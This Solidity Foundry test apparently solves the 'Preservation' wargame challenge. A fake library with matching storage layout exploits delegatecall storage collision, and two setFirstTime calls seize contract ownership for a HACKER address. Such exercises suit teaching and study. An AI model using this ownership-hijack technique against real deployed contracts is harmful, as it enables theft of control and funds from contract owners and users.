// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "src/Preservation.sol";

contract PreservationTest is Test {
    Preservation private preservation;
    LibraryContract private lib1;
    LibraryContract private lib2;
    FakeLib private fakelib;
    address private constant HACKER = address(0x3);
    function setUp() external {
        lib1 = new LibraryContract();
        lib2 = new LibraryContract();
        fakelib = new FakeLib();
        preservation = new Preservation(address(lib1), address(lib2));
        vm.deal(HACKER, 10e18);
        vm.startPrank(HACKER);
    }

    function testHack() external {
        preservation.setFirstTime(uint(uint160(address(fakelib))));
        preservation.setFirstTime(uint(uint160(HACKER)));
        assertEq(preservation.owner(), HACKER);
    }
}

contract FakeLib {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;
    function setTime(uint256 _time) external {
        owner = address(uint160(_time));
    }
}